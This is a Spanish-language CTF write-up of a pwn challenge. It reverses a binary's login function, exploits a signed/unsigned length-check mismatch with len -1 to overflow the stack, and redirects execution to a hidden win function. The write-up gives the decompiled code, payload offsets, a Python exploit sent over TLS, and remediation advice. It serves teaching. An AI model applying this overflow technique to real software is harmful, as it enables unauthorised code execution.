# Write-up — The Password is Swordfish

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | Pwn |
| **Dificultad** | Easy |
| **Puntos** | 245 |
| **Flag** | `flag{8fc3746db76fb4e8}` |
| **Vulnerabilidad** | Buffer overflow por comparación de longitud con/sin signo → ret2win (sin canary) |

---

## 1. Enunciado

> FluidSec shipped a shiny new Vault auth service. The dev team swears the password
> length check is bulletproof. They swear a lot.

Adjunto: `public.zip` (AES, contraseña `infected`) con un único binario `vault`.
Instancia: `8e42a3fb2baddd47.chal.ctf.ae` — el servicio se expone **sobre TLS en el
puerto 443** (no como `nc` plano; la plataforma cloud lo tuneliza por HTTPS).

---

## 2. Reconocimiento del binario

```
$ file vault
vault: ELF 64-bit LSB executable, x86-64, statically linked, not stripped
```

- **Estáticamente enlazado** y **no stripped** → símbolos disponibles.
- Existe `__stack_chk` (viene de la glibc estática), pero la función vulnerable
  `login` **no usa canary** (termina en `leave; ret`, sin `mov rax, fs:0x28`).

Strings relevantes: `/flag.txt`, `Password length:`, `Too long! Max 64 characters.`,
`Access granted...`, `Access denied.`

### 2.1 La función `win` (nunca llamada)

En `0x401b85` hay una función que abre e imprime la flag, pero el flujo normal jamás
la invoca — el objetivo es un **ret2win**:

```c
void win() {                        // 0x401b85
    FILE *f = fopen("/flag.txt", "r");
    if (!f) { puts("Error: could not read flag."); return; }
    char buf[0x80];
    if (fgets(buf, 0x80, f)) puts(buf);
    fclose(f);
}
```

---

## 3. La vulnerabilidad (`login` @ 0x401c03)

Reconstruido del desensamblado:

```c
void login() {
    int len;                        // [rbp-0x54]
    char buf[0x48];                 // [rbp-0x50]  (buffer)
    int c;                          // [rbp-0x8]
    int i;                          // [rbp-0x4]

    printf("Password length: ");
    scanf("%d", &len);              // len con SIGNO
    getchar();
    if (len > 64) {                 // cmp eax,0x40 ; jle  -> comparación CON SIGNO
        puts("Too long! Max 64 characters.");
        exit(1);
    }
    printf("Password: ");
    for (i = 0; i < len; i++) {     // cmp i,len ; jb   -> comparación SIN SIGNO
        c = getchar();
        if (c == EOF || c == '\n') break;
        buf[i] = c;
    }
    buf[i] = 0;
    if (strcmp(buf, "swordfish") == 0) puts("Access granted. Welcome back, admin.");
    else puts("Access denied.");
}
```

El fallo son **dos comparaciones con firma distinta sobre el mismo `len`**:

1. El check `len > 64` se compila como `jle` (**con signo**). Un `len` **negativo**
   (p. ej. `-1`) es `<= 64`, así que **pasa**.
2. El bucle `i < len` se compila como `jb` (**sin signo**). Con `len = -1`, el límite
   se interpreta como `0xFFFFFFFF`, prácticamente infinito.

Resultado: enviando `len = -1` el bucle copia bytes en `buf` **sin límite real**
(solo se detiene con `\n` o EOF), desbordando la pila. Como `login` no tiene canary,
se sobrescribe directamente la dirección de retorno.

---

## 4. Construcción del exploit

Buffer en `rbp-0x50` (80 bytes hasta `rbp`). Distancia a la dirección de retorno:
`80 + 8 (saved rbp) = 88`, y luego 8 bytes con la dirección de `win`.

**Complicación de layout:** el contador del bucle `i` vive en `rbp-0x4`, es decir en
los **índices 76–79 del propio buffer**. Un relleno naïve (`"A"*88`) sobrescribe `i`
a mitad de copia (`i` pasa a valer `0x41` y el bucle se descarrila — de hecho el
primer intento imprimió "Access denied" sin saltar). La solución es fijar esos 4
bytes para que el contador siga siendo lineal:

```
idx 0..75   relleno                     (incluye la var 'c' en 72..75)
idx 76..79  4c 00 00 00   -> i sigue 76→77→78→79 sin corromperse
idx 80..87  relleno (saved rbp)
idx 88..95  p64(0x401b85) -> win
```

Como la copia es un `getchar()` byte a byte que solo corta con `\n`, los **null
bytes** de la dirección de `win` no son problema (a diferencia de `scanf`/`gets`).

Payload completo: `"-1\n"` + los 96 bytes anteriores + `"\n"`.

```python
WIN = 0x401b85
buf = b"A"*76 + bytes([0x4c,0,0,0]) + b"B"*8 + struct.pack("<Q", WIN)
payload = b"-1\n" + buf + b"\n"
```

### 4.1 Transporte remoto (TLS en 443)

El único puerto abierto de la instancia es el **443**, y el servicio va **tunelizado
sobre TLS**. Hay que envolver el socket:

```python
ctx = ssl.create_default_context()
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)
s.sendall(payload)
```

---

## 5. Resultado

```
Password length: Password: Access denied.
flag{8fc3746db76fb4e8}
```

("Access denied" es esperado: `strcmp` falla, pero da igual — el `ret` ya está
apuntando a `win`, que corre justo después e imprime la flag.)

```
flag{8fc3746db76fb4e8}
```

---

## 6. Causa raíz y remediación

**Causa raíz:** mezcla de tipos con y sin signo al validar y luego usar la misma
longitud. La validación fue "con signo" y el uso "sin signo", así que un valor
negativo satisface el límite y luego se reinterpreta como enorme. Es el patrón
clásico de *signedness bug* que convierte un length-check en un overflow.

**Cómo se arregla:**

- **Usar tipos sin signo (`size_t`) para longitudes** y validar el rango completo:
  `if (len == 0 || len > 64) reject;` con `len` no negativo por construcción.
- **No confiar en un solo check;** acotar la escritura por el tamaño del buffer en el
  propio bucle (`i < sizeof(buf)-1`), independientemente de `len`.
- **Compilar con mitigaciones**: `-fstack-protector-strong` (canary), `-D_FORTIFY_SOURCE=2`,
  PIE + RELRO completo. Aquí ni siquiera había canary en la función vulnerable.
- **Eliminar funciones "muertas" peligrosas** como `win()` del binario de producción.

**Lección de CTF (Pwn):** ante un "length check bulletproof", el primer test es
enviar valores negativos o extremos (`-1`, `0`, `INT_MIN`) — los bugs de signo son de
los más frecuentes. Y siempre revisar si el buffer comparte marco con el contador del
bucle, porque cambia el offset efectivo del overflow.
